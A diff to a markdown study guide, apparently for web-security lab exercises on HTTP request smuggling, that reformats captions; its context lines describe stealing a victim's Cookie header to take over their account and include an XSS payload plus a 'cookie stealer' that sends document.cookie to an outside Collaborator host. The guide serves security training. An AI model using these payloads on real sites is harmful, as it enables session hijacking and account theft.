@@ -468,7 +468,7 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
   
 ![Exploiting HTTP request smuggling with content-length value](images/content-length-capture-victim-request.png)  
 
-<sub>No new line at end of the smuggled POST request above^^ </sub>  
+>No new line at end of the smuggled POST request above^^.  
 
 >View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.  
   
@@ -481,13 +481,13 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 
 >Identify the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  
 
-<sup>Basic Cross Site Scripting Payload escaping out of HTML document.</sup>  
+>Basic Cross Site Scripting Payload escaping out of HTML document.  
 
 ```JavaScript
  "/><script>alert(1)</script>
 ```
 
-<sub>COOKIE STEALER Payload</sub>  
+>COOKIE STEALER Payload.  
 
 ```JavaScript
 a"/><script>document.location='http://Collaborator.com/?cookiestealer='+document.cookie;</script>
